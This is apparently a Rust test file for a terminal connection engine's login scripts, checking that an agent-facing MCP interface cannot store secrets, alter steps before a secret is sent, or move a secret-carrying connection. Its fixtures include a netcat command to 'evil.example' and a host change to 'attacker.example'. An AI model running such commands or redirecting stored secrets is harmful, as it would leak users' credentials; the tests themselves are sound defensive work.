use crate::{
    Command, ConnectionDraft, ConnectionId, ConnectionPatch, Engine, EngineEvent, LoginScriptDraft,
    LoginScriptId, LoginScriptInfo, LoginScriptPatch, Outcome, Pattern, ScriptSecretRef,
    SecretParam, Step, TreeChange, TreeItem,
};

pub(super) const MASTER: &str = "correct horse battery";

pub(super) use crate::test_support::engine_in;

/// The sudo template's steps, sending the stored secret `secret` when given.
pub(super) fn sudo_steps(secret: Option<i64>) -> Vec<Step> {
    let source = secret.map_or(ScriptSecretRef::ConnectionPassword, |id| {
        ScriptSecretRef::Stored { id }
    });
    vec![
        Step::SendText {
            text: "sudo -i".into(),
            newline: true,
        },
        Step::WaitFor {
            pattern: Pattern::new("(?i)password.*:").expect("pattern"),
            timeout_ms: Some(2_000),
        },
        Step::SendSecret {
            source,
            newline: true,
        },
    ]
}

pub(super) async fn create(engine: &Engine, name: &str) -> LoginScriptInfo {
    let draft = LoginScriptDraft {
        name: name.into(),
        steps: sudo_steps(None),
        step_timeout_ms: None,
        total_timeout_ms: None,
    };
    match engine
        .dispatch(Command::CreateLoginScript { script: draft })
        .await
    {
        Ok(Outcome::LoginScript { script }) => script,
        other => panic!("a login script, got {other:?}"),
    }
}

pub(super) async fn connection(engine: &Engine) -> ConnectionId {
    match engine
        .dispatch(Command::CreateConnection {
            folder_id: None,
            connection: ConnectionDraft::new("web", "example.org"),
        })
        .await
    {
        Ok(Outcome::Connection { connection }) => connection.id,
        other => panic!("a connection, got {other:?}"),
    }
}

#[tokio::test]
async fn a_script_is_created_read_changed_and_listed_with_events() {
    let dir = tempfile::tempdir().expect("dir");
    let engine = engine_in(dir.path()).await;
    let mut events = engine.subscribe();
    let created = create(&engine, "sudo").await;
    assert_eq!(created.steps, sudo_steps(None));
    assert_eq!(created.step_timeout_ms, 15_000);
    assert_eq!(
        events.try_recv().expect("an event"),
        EngineEvent::LoginScript {
            script: created.id,
            change: TreeChange::Created
        }
    );

    let patch = LoginScriptPatch {
        name: Some("root".into()),
        total_timeout_ms: Some(30_000),
        ..LoginScriptPatch::default()
    };
    let Ok(Outcome::LoginScript { script: changed }) = engine
        .dispatch(Command::UpdateLoginScript {
            id: created.id,
            patch,
        })
        .await
    else {
        panic!("an updated script");
    };
    assert_eq!(changed.name, "root");
    assert_eq!(changed.steps, created.steps, "steps stay when not named");
    assert_eq!(changed.total_timeout_ms, 30_000);

    let Ok(Outcome::LoginScripts { scripts }) = engine.dispatch(Command::ListLoginScripts).await
    else {
        panic!("a list");
    };
    assert_eq!(scripts, std::slice::from_ref(&changed));
    assert_eq!(
        engine
            .dispatch(Command::GetLoginScript { id: created.id })
            .await
            .expect("get"),
        Outcome::LoginScript { script: changed }
    );
}

#[tokio::test]
async fn a_script_beyond_its_bounds_or_a_taken_name_is_refused() {
    let dir = tempfile::tempdir().expect("dir");
    let engine = engine_in(dir.path()).await;
    let first = create(&engine, "sudo").await;
    let draft = LoginScriptDraft {
        name: "slow".into(),
        steps: vec![Step::Sleep { ms: 3_600_000 }],
        step_timeout_ms: None,
        total_timeout_ms: None,
    };
    let refused = engine
        .dispatch(Command::CreateLoginScript { script: draft })
        .await
        .expect_err("refused");
    assert_eq!(refused.code(), "login_script_timeout_invalid");
    let taken = engine
        .dispatch(Command::UpdateLoginScript {
            id: create(&engine, "other").await.id,
            patch: LoginScriptPatch {
                name: Some("SUDO".into()),
                ..LoginScriptPatch::default()
            },
        })
        .await
        .expect_err("taken");
    assert_eq!(taken.code(), "name_taken");
    let missing = engine
        .dispatch(Command::GetLoginScript {
            id: LoginScriptId(first.id.0 + 100),
        })
        .await
        .expect_err("missing");
    assert_eq!(missing.code(), "login_script_not_found");
}

#[tokio::test]
async fn a_connection_runs_its_script_until_the_script_is_deleted() {
    let dir = tempfile::tempdir().expect("dir");
    let engine = engine_in(dir.path()).await;
    let script = create(&engine, "sudo").await;
    let web = connection(&engine).await;
    let mut events = engine.subscribe();
    let Ok(Outcome::Connection { connection }) = engine
        .dispatch(Command::AssignLoginScript {
            connection_id: web,
            script_id: Some(script.id),
        })
        .await
    else {
        panic!("the connection");
    };
    assert_eq!(connection.login_script_id, Some(script.id.0));
    assert_eq!(
        events.try_recv().expect("an event"),
        EngineEvent::ConnectionTree {
            item: TreeItem::Connection(web),
            change: TreeChange::Updated
        }
    );

    let Ok(Outcome::LoginScriptDeleted { id, deletion }) = engine
        .dispatch(Command::DeleteLoginScript { id: script.id })
        .await
    else {
        panic!("a deletion");
    };
    assert_eq!((id, deletion.connections), (script.id, 1));
    let Ok(Outcome::Connection { connection }) =
        engine.dispatch(Command::GetConnection { id: web }).await
    else {
        panic!("the connection");
    };
    assert_eq!(connection.login_script_id, None);
}

#[tokio::test]
async fn scripts_survive_a_restart() {
    let dir = tempfile::tempdir().expect("dir");
    let created = {
        let engine = engine_in(dir.path()).await;
        create(&engine, "sudo").await
    };
    let engine = engine_in(dir.path()).await;
    let Ok(Outcome::LoginScripts { scripts }) = engine.dispatch(Command::ListLoginScripts).await
    else {
        panic!("a list");
    };
    assert_eq!(scripts, [created]);
}

#[tokio::test]
async fn mcp_cannot_store_or_remove_a_script_secret() {
    let dir = tempfile::tempdir().expect("dir");
    let engine = engine_in(dir.path()).await;
    let script = create(&engine, "sudo").await;
    for command in [
        Command::SetLoginScriptSecret {
            script_id: script.id,
            label: "root".into(),
            value: SecretParam::from("hunter2-root"),
        },
        Command::ClearLoginScriptSecret {
            script_id: script.id,
            secret_id: 1,
        },
    ] {
        let error = engine.dispatch_mcp(command).await.expect_err("refused");
        assert_eq!(error.code(), "gui_only");
    }
}

/// Through MCP no secret answers a prompt an agent chose: no new script with a `send_secret`
/// step, no change up to the last one, none added, and no such script assigned. The window may.
#[tokio::test]
async fn mcp_cannot_touch_a_send_secret_step_or_what_leads_to_it() {
    let dir = tempfile::tempdir().expect("dir");
    let engine = engine_in(dir.path()).await;
    let script = create(&engine, "sudo").await;
    let wait = |pattern: &str| Step::WaitFor {
        pattern: Pattern::new(pattern).expect("pattern"),
        timeout_ms: None,
    };
    let update = |steps: Vec<Step>| Command::UpdateLoginScript {
        id: script.id,
        patch: LoginScriptPatch {
            steps: Some(steps),
            ..LoginScriptPatch::default()
        },
    };
    let web = connection(&engine).await;
    let base = sudo_steps(None);
    let secret = base[2].clone();

    let mut new_pattern = base.clone();
    new_pattern[1] = wait("(?i)token:");
    let mut new_command = base.clone();
    new_command[0] = Step::SendText {
        text: "nc evil.example 4444".into(),
        newline: true,
    };
    let mut moved = base.clone();
    moved.insert(0, Step::SendLine);
    let mut added = base.clone();
    added.extend([wait("again:"), secret.clone()]);
    let mut removed = base.clone();
    removed.remove(2);
    let refused = [
        Command::CreateLoginScript {
            script: LoginScriptDraft {
                name: "new".into(),
                steps: vec![secret],
                step_timeout_ms: None,
                total_timeout_ms: None,
            },
        },
        update(new_pattern),
        update(new_command),
        update(moved),
        update(added),
        update(removed),
        Command::AssignLoginScript {
            connection_id: web,
            script_id: Some(script.id),
        },
    ];
    for command in refused {
        let error = engine
            .dispatch_mcp(command.clone())
            .await
            .expect_err("refused");
        assert_eq!(error.code(), "gui_only", "{command:?}");
    }

    // After the last secret an agent may change what it likes; the window may change anything.
    let mut appended = base.clone();
    appended.push(Step::SendText {
        text: "cd /srv".into(),
        newline: true,
    });
    engine
        .dispatch_mcp(update(appended))
        .await
        .expect("steps after the secret");
    let plain = engine
        .dispatch_mcp(Command::CreateLoginScript {
            script: LoginScriptDraft {
                name: "plain".into(),
                steps: vec![Step::SendText {
                    text: "cd /srv".into(),
                    newline: true,
                }],
                step_timeout_ms: None,
                total_timeout_ms: None,
            },
        })
        .await;
    let Ok(Outcome::LoginScript { script: plain }) = plain else {
        panic!("a script without secrets, got {plain:?}");
    };
    engine
        .dispatch_mcp(Command::AssignLoginScript {
            connection_id: web,
            script_id: Some(plain.id),
        })
        .await
        .expect("a script without secrets");
    let mut changed = base;
    changed[1] = wait("(?i)token:");
    engine.dispatch(update(changed)).await.expect("the window");
}

/// RC-080-12 (M5): a connection whose login script sends a secret is held to its endpoint under
/// MCP as one with a stored secret is - a new host would get the script's secret typed at it.
#[tokio::test]
async fn mcp_never_moves_a_connection_whose_script_sends_a_secret() {
    let dir = tempfile::tempdir().expect("dir");
    let engine = engine_in(dir.path()).await;
    let script = create(&engine, "sudo").await;
    let web = connection(&engine).await;
    let assign = |script_id| Command::AssignLoginScript {
        connection_id: web,
        script_id,
    };
    engine
        .dispatch(assign(Some(script.id)))
        .await
        .expect("assigned");
    let to_attacker = || Command::UpdateConnection {
        id: web,
        patch: ConnectionPatch {
            host: Some("attacker.example".into()),
            ..ConnectionPatch::default()
        },
    };
    let refused = engine
        .dispatch_mcp(to_attacker())
        .await
        .expect_err("refused");
    assert_eq!(refused.code(), "endpoint_change_needs_gui");

    // Without the script there is nothing to carry.
    engine.dispatch(assign(None)).await.expect("unassigned");
    engine
        .dispatch_mcp(to_attacker())
        .await
        .expect("no secret to carry");
}
